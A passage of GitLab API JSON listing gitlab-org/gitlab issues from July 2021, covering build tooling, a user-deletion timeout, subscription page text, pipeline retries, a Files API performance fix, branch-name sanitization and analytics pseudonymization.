Holtz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/142752/avatar.png","web_url":"https://gitlab.com/garyh"}],"author":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"type":"ISSUE","assignee":{"id":142752,"username":"garyh","name":"Gary Holtz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/142752/avatar.png","web_url":"https://gitlab.com/garyh"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337351","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337351","notes":"https://gitlab.com/api/v4/projects/278964/issues/337351/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337351/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337351","relative":"#337351","full":"gitlab-org/gitlab#337351"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6524,"epic":{"id":321042,"iid":6524,"title":"Engineering Allocation (Code Review BE): 02-AUG-2021","url":"/groups/gitlab-org/-/epics/6524","group_id":9970,"human_readable_end_date":"Oct 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91166872,"iid":337338,"project_id":278964,"title":"Version-app: Investigate migrating to Cloud Native Buildpack","description":"As of GitLab 14.0, Auto Build uses Cloud Native Buildpacks by default. We currently set `AUTO_DEVOPS_BUILD_IMAGE_CNB_ENABLED` to `false` so that we can continue using Herokuish, however we should investigate the effort and impact of migrating to CNB, since this is now the preferred method of building applications.\n\nAnother reason to do this is [dogfooding](https://about.gitlab.com/handbook/engineering/#dogfooding). If we recommend CNB to our customers then we should use it ourselves as well.\n\nRelated to https://gitlab.com/gitlab-org/gitlab/-/merge_requests/63351 and https://gitlab.com/gitlab-org/gitlab/-/issues/212692.","state":"closed","created_at":"2021-07-30T17:39:26.309Z","updated_at":"2021-10-28T13:54:28.416Z","closed_at":"2021-09-27T21:23:51.459Z","closed_by":{"id":4373269,"username":"ali-gitlab","name":"Alishan Ladhani","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4373269/avatar.png","web_url":"https://gitlab.com/ali-gitlab"},"labels":["auto updated","devops::growth","group::product intelligence","section::growth","type::maintenance"],"milestone":null,"assignees":[],"author":{"id":4373269,"username":"ali-gitlab","name":"Alishan Ladhani","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4373269/avatar.png","web_url":"https://gitlab.com/ali-gitlab"},"type":"ISSUE","assignee":null,"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337338","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337338","notes":"https://gitlab.com/api/v4/projects/278964/issues/337338/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337338/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337338","relative":"#337338","full":"gitlab-org/gitlab#337338"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6371,"epic":{"id":309188,"iid":6371,"title":"Version-App maintenance","url":"/groups/gitlab-org/-/epics/6371","group_id":9970,"human_readable_end_date":"Mar 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":91166462,"iid":337336,"project_id":278964,"title":"User deletion times out due to merge request update","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nDeleting a user results in a timeout, seemingly because the system is attempting to update merge requests associated with the commits for that user.\n\n### Steps to reproduce\n\n1. Attempt to delete a user (doesn't happen with every user) through the UI or API.\n1. Observe a `500` error upon deletion, if deletion was done through the UI.\n1. If through the API, note that you receive the expected `204` response.\n1. Filter Sidekiq logs for `json.meta.client_id` to `user/USER_ID` and `json.class` on `DeleteUserWorker` and observe the error: `PG::QueryCanceled: ERROR:  canceling statement due to statement timeout`.\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\nUser deletion will time out while the system tries to update merge requests that have commits associated to the user being deleted.\n\n### What is the expected *correct* behavior?\n\nWe should be able to reliably delete users regardless of the content of their account.\n\n### Relevant logs and/or screenshots\n\nSidekiq logs: https://log.gprd.gitlab.net/app/discover#/doc/AWNABDRwNDuQHTm2tH6l/pubsub-sidekiq-inf-gprd-001760?id=EzQg-HoB-RTw6rRRKRcl that contain the user ID of an example user.\n\nRails console output:\n\n```ruby\nActiveRecord::QueryCanceled (PG::QueryCanceled: ERROR:  canceling statement due to statement timeout)\nCONTEXT:  SQL statement \"UPDATE ONLY \"public\".\"merge_request_metrics\" SET \"merged_by_id\" = NULL WHERE $1 OPERATOR(pg_catalog.=) \"merged_by_id\"\"\n```\n\n```ruby\n[ gprd ] production\u003e u.delete\nD, [2021-07-30T17:49:39.815821 #15785] DEBUG -- :   User Destroy (15025.1ms)  /*application:console*/ DELETE FROM \"users\" WHERE \"users\".\"id\" = REDACTED\nTraceback (most recent call last):\n        7: from (irb):5\n        6: from lib/gitlab/database/load_balancing/connection_proxy.rb:59:in `block (2 levels) in \u003cclass:ConnectionProxy\u003e'\n        5: from lib/gitlab/database/load_balancing/connection_proxy.rb:110:in `write_using_load_balancer'\n        4: from lib/gitlab/database/load_balancing/load_balancer.rb:97:in `read_write'\n        3: from lib/gitlab/database/load_balancing/load_balancer.rb:207:in `retry_with_backoff'\n        2: from lib/gitlab/database/load_balancing/load_balancer.rb:101:in `block in read_write'\n        1: from lib/gitlab/database/load_balancing/connection_proxy.rb:116:in `block in write_using_load_balancer'\nActiveRecord::QueryCanceled (PG::QueryCanceled: ERROR:  canceling statement due to statement timeout)\nCONTEXT:  SQL statement \"UPDATE ONLY \"public\".\"merge_requests\" SET \"merge_user_id\" = NULL WHERE $1 OPERATOR(pg_catalog.=) \"merge_user_id\"\"\n```\n\n### Output of checks\n\nThis bug happens on GitLab.com: `14.2.0-pre 93e6c4d339b`","state":"closed","created_at":"2021-07-30T17:28:21.801Z","updated_at":"2022-05-04T09:21:25.949Z","closed_at":"2022-05-04T09:21:25.924Z","closed_by":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"labels":["approaching-SLO","backend","devops::manage","group::optimize","missed-SLO","priority::2","reproduced on GitLab.com","section::dev","severity::2","type::bug","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"}],"author":{"id":2390023,"username":"tristan","name":"Tristan Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2390023/avatar.png","web_url":"https://gitlab.com/tristan"},"type":"ISSUE","assignee":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"user_notes_count":28,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337336","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337336","notes":"https://gitlab.com/api/v4/projects/278964/issues/337336/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337336/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337336","relative":"#337336","full":"gitlab-org/gitlab#337336"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7353,"epic":{"id":415909,"iid":7353,"title":"Timeout failure when attempting to delete records with many dependent records","url":"/groups/gitlab-org/-/epics/7353","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91162083,"iid":337328,"project_id":278964,"title":"Admin Subscription Page \"USERS IN SUBSCRIPTION\" text incorrectly states guest users are free on Premium and Starter","description":"### Summary\n\nThe Subscription page at `/admin/subscription` displays license usage when a license is uploaded or activated.  In the \"Users in Subscription\" box, the description text states:\n\n\u003e Users with a Guest role or those who don't belong to a Project or Group will not use a seat from your license.\n\nThis description is shown for any uploaded license, including a Starter and Premium, which is inaccurate: Guests and users without group/project are only [free in Ultimate](https://docs.gitlab.com/ee/user/permissions.html#free-guest-users).\n\n### Steps to reproduce\n\nOnly tested non-cloud licenses\n\n1. Upload a Starter or Premium license on 14.0+\n1. View `/admin/subscription`\n\n### Relevant logs and/or screenshots\n\n![screenshot-2021-07-30-11_09_1](/uploads/8463d5cc744d5ca55122d10333d8e245/screenshot-2021-07-30-11_09_1.png)\n\n![screenshot-2021-07-30-11_09](/uploads/881a118d071427972b8495f468abe8ab/screenshot-2021-07-30-11_09.png)\n\n#### Results of GitLab environment info\n\nVersion:\t14.1.1-ee\nRevision:\tf331f932688\n\n### Solution\n\nThis appears to be frontend only.  In all cases, `LicenseHelper` accurately reports when guests are considered free\n\nStarter:\n\n```ruby\n\u003e License.current.license.restrictions[:plan]\n=\u003e \"starter\"\n\u003e LicenseHelper::seats_calculation_message(License.current)\n=\u003e nil\n```\n\nUltimate:\n\n```ruby\n\u003e License.current.license.restrictions[:plan]\n=\u003e \"ultimate\"\n\u003e LicenseHelper::seats_calculation_message(License.current)\n=\u003e \"Users with a Guest role or those who don't belong to a Project or Group will not use a seat from your license.\"\n```\n\nConclusion: Show the [\"Users in Subscription\" card](https://gitlab.com/gitlab-org/gitlab/-/blob/03083de3154722d26cf3fba0cdc4a843b64ad1c3/ee/app/assets/javascripts/admin/subscriptions/show/components/subscription_details_user_info.vue#L69) _only_ for Ultmiate","state":"closed","created_at":"2021-07-30T16:11:19.470Z","updated_at":"2022-03-30T08:43:36.269Z","closed_at":"2022-03-30T08:43:36.252Z","closed_by":{"id":447038,"username":"vitallium","name":"Vitaly Slobodin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/74b3243cfcfbfac1f022b78ab505e8d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/vitallium"},"labels":["[deprecated] Category:Provision","devops::fulfillment","frontend","group::provision","missed:14.3","missed:14.6","section::fulfillment","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":447038,"username":"vitallium","name":"Vitaly Slobodin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/74b3243cfcfbfac1f022b78ab505e8d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/vitallium"}],"author":{"id":4447183,"username":"kevenhughes","name":"Keven Hughes","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447183/avatar.png","web_url":"https://gitlab.com/kevenhughes"},"type":"ISSUE","assignee":{"id":447038,"username":"vitallium","name":"Vitaly Slobodin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/74b3243cfcfbfac1f022b78ab505e8d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/vitallium"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337328","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337328","notes":"https://gitlab.com/api/v4/projects/278964/issues/337328/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337328/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337328","relative":"#337328","full":"gitlab-org/gitlab#337328"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91160356,"iid":337320,"project_id":278964,"title":"Bridge jobs can't be restarted if a pipeline is canceled.","description":"~\"team::Delivery\" uses [multi-project pipelines](https://docs.gitlab.com/ee/ci/pipelines/multi_project_pipelines.html) to trigger deployments to our different environments: staging-canary, staging, canary, and production. In a general overview, the release-tools pipeline, also known as the coordinated pipeline: tags, builds a package and then deploys it through our different environments by triggering a pipeline into the [deployer project](https://gitlab.com/gitlab-com/gl-infra/deployer). The complete definition of this coordinated pipeline can be found in [the `release-tools` repository](https://gitlab.com/gitlab-org/release-tools/-/blob/master/.gitlab/ci/coordinated-pipeline.gitlab-ci.yml). \n\nOn more than one occasion, we've canceled and retried a coordinated pipeline, only to notice that the bridge jobs were not restarted as expected, they continue to be marked as `skipped`. Example:\n\n* Pipeline: https://ops.gitlab.net/gitlab-org/release/tools/-/pipelines/717341 [^1]\n* Screenshot: ![Screen_Shot_2021-07-30_at_10.28.02](/uploads/7bef2744c2c65271fcdd56335de8d00c/Screen_Shot_2021-07-30_at_10.28.02.png)\n\nThis was surprising to us as we were expecting that restarting the parent pipeline would cause the bridge jobs to be restarted as well.   \n\n### Expected outcome\n\nWhen canceling and retrying an upstream pipeline, the bridge jobs should be restarted as well.\n\n\n[Slack conversation](https://gitlab.slack.com/archives/C0139MAV672/p1627585463074200) - Internal only\n[^1]: You might not have access to this repository for compliance reasons.","state":"closed","created_at":"2021-07-30T15:31:56.537Z","updated_at":"2022-12-01T20:23:32.189Z","closed_at":"2021-10-19T12:23:20.114Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","auto updated","backend","bridge pipelines","devops::verify","group::pipeline authoring","priority::3","section::ops","severity::3","type::bug","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":33100,"username":"mayra-cabrera","name":"Mayra Cabrera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/33100/avatar.png","web_url":"https://gitlab.com/mayra-cabrera"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":30,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337320","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337320","notes":"https://gitlab.com/api/v4/projects/278964/issues/337320/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337320/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337320","relative":"#337320","full":"gitlab-org/gitlab#337320"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91154596,"iid":337309,"project_id":278964,"title":"Follow-up from \"Refactor LoadBalancing::LoadBalancer to support scoping it to different models\"","description":"The following discussion from !67057 should be addressed:\n\n- [ ] @ayufan started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67057#note_638714350): \n\n    \u003e TODO: The callers of this methods are to be fixed to support many databases. The `db_role_for_connection` is used a single identifier to indicate connection used.\n    \u003e \n    \u003e The potential here is to ensure that our logs do use the: `db_main_primary/db_main_replica/db_ci_primary/db_ci_replica`. And ensure that our prometheus metrics provide a role and specification as two separate informations for metrics.","state":"closed","created_at":"2021-07-30T13:32:56.511Z","updated_at":"2021-09-13T15:46:12.358Z","closed_at":"2021-09-13T15:46:12.350Z","closed_by":{"id":12452,"username":"ayufan","name":"Kamil Trzciński","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a285e30f35d72526fb0954e8fe7cefa?s=80\u0026d=identicon","web_url":"https://gitlab.com/ayufan"},"labels":["[deprecated] Accepting merge requests","auto updated"],"milestone":null,"assignees":[],"author":{"id":12452,"username":"ayufan","name":"Kamil Trzciński","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a285e30f35d72526fb0954e8fe7cefa?s=80\u0026d=identicon","web_url":"https://gitlab.com/ayufan"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337309","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337309","notes":"https://gitlab.com/api/v4/projects/278964/issues/337309/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337309/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337309","relative":"#337309","full":"gitlab-org/gitlab#337309"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5974,"epic":{"id":268361,"iid":5974,"title":"Generalise our Load Balancing usage to allow many databases","url":"/groups/gitlab-org/-/epics/5974","group_id":9970,"human_readable_end_date":"Sep 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91153567,"iid":337308,"project_id":278964,"title":"Files API: Avoid loading the whole blob in memory","description":"Currently, we [load](https://gitlab.com/gitlab-org/gitlab/-/blob/a5695bb32eff2d646c43dcbe226d11b929babffc/lib/api/files.rb#L41) the whole blob in memory on calling Files API endpoints. Loading a large file via Gitlab Rails may be severe from performance perspective.\n\nWe could avoid loading the whole blob and serve the request via Workhorse, like we plan to do in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67155, but we have `X-Gitlab-Content-Sha256` header that is calculated based on the whole file content. The header has been added within https://gitlab.com/gitlab-org/gitlab-foss/-/issues/47315 to verify the file content. I wonder if we can recommend using `X-Gitlab-Blob-Id` instead of `X-Gitlab-Content-Sha256` in this case. It's weaker but is also based on content anyway. Other solutions can be [calculating it on Workhorse side](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67155#note_639568807) or [prematurely calculate it for a blob](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67155#note_639590743).","state":"closed","created_at":"2021-07-30T13:16:24.453Z","updated_at":"2021-10-20T19:13:24.786Z","closed_at":"2021-08-25T12:43:34.807Z","closed_by":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"labels":["Category:Source Code Management","auto updated","backend","bug::performance","devops::create","group::source code","section::dev"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"}],"author":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"type":"ISSUE","assignee":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337308","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337308","notes":"https://gitlab.com/api/v4/projects/278964/issues/337308/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337308/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337308","relative":"#337308","full":"gitlab-org/gitlab#337308"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6298,"epic":{"id":302538,"iid":6298,"title":"Create:Source Code BE Error Budgets tracking","url":"/groups/gitlab-org/-/epics/6298","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91152428,"iid":337305,"project_id":278964,"title":"Sanitize default branch name in Repository settings","description":"### Proposal\n\nSanitize _default initial branch name_ in the group repository settings\n\n`\u003cgitlab-instance\u003e/groups/\u003cgroup-name\u003e/-/settings/repository#js-default-branch-name`\n\n### Why\n\nWe've found some security issues like https://gitlab.com/gitlab-org/gitlab/-/issues/336460 and sanitizing the values before storing in the database could prevent similar issues in the future.\n\n### Implementation Plan\n\n- [x] Add sanitization in [namespace_settings](https://gitlab.com/gitlab-org/gitlab/blob/f88b2f61621c4177adbd3ac68fa7e53f95aab811/app/models/namespace_setting.rb#L24)\n- [x] Add sanitization in admin settings\n- [x] Update specs","state":"closed","created_at":"2021-07-30T12:54:41.151Z","updated_at":"2021-11-03T19:50:24.471Z","closed_at":"2021-08-05T08:38:16.967Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["Category:Source Code Management","backend","devops::create","group::analyzer frontend","priority::3","section::dev","security","severity::3","type::bug","workflow::in review"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"}],"author":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-10-28","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337305","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337305","notes":"https://gitlab.com/api/v4/projects/278964/issues/337305/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337305/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337305","relative":"#337305","full":"gitlab-org/gitlab#337305"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91149646,"iid":337300,"project_id":278964,"title":"(2) Build Pseudonymization of IDs and PII Data for Snowplow on AWS Collector layer","description":"## Goal\n\nIn order to understand single user behavior patterns, but not connect it to any natural person using GitLab we need to pseudonymize user_id before it can be recorded anywhere.\n\n## What should be pseuydonymized \n\n_Reference issue: https://gitlab.com/gitlab-org/gitlab/-/issues/336779_\n\n| field        | need pseudonymization | reasoning | who made decision|\n|--------------|-----------------------|-----------|------------------| \n| user_id      |      Yes                 |    This is an indirect indentifier which can be used to reveal directly identifiable data. With `user_id` anyone can access `name` and `username` of both public and private profiles.       |    @amandarueda               |\n\n\n## Technical implementation\n\n### Tasks\n\n1. Deploy pseudonymization secret to AWS (https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/14021)\n    1. [ ] Check if https://ops.gitlab.net/gitlab-com/gitlab-com-infrastructure/-/blob/master/bin/tf-get-secrets can be somehow utilized?\n    1. [x] Check ENV vars for AWS Lambdas\n1. Enhance [lambda function](https://ops.gitlab.net/gitlab-com/gitlab-com-infrastructure/-/tree/master/environments/aws-snowplow/lambda) that is run by Firehose to pseudonymize data before saving it to S3 buckets\n    1. [x] Check if it might be converted from python to ruby https://docs.aws.amazon.com/lambda/latest/dg/lambda-ruby.html\n       1. It should be able to read https://docs.snowplowanalytics.com/docs/understanding-your-pipeline/canonical-event/understanding-the-enriched-tsv-format/\n       1. It should be applicable to Kinesis Firehose data trasnformations https://docs.aws.amazon.com/firehose/latest/dev/data-transformation.html https://aws.amazon.com/blogs/compute/amazon-kinesis-firehose-data-transformation-with-aws-lambda/\n1. [ ] Check with data team if any existing field in Snowflake has to be modified in order to be able to store pseudonymized values, eg: integer to string conversion, or text limits etc\n\n### References and materials\n\n1. Official python snowplow sdk https://github.com/snowplow/snowplow-python-analytics-sdk/tree/0.2.3 unfortunately it is tailored for working with elastic search, but we can draw a lot of inspiration from implementation itself","state":"closed","created_at":"2021-07-30T11:57:28.182Z","updated_at":"2022-01-14T15:21:43.710Z","closed_at":"2021-09-17T08:56:23.770Z","closed_by":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"labels":["auto updated","backend","devops::growth","group::product 